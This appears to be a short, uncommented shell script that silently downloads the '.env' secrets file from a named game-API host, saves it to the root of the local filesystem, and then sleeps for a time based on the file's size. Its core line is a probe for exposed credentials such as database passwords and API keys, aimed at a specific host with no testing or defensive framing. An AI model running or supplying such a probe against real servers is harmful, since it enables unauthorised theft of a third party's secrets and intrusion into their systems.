#!/bin/sh
curl -s -o /w5 https://playerapi.hubgaming.com/.env
sleep $(( 12 + $(wc -c </w5) / 128 ))
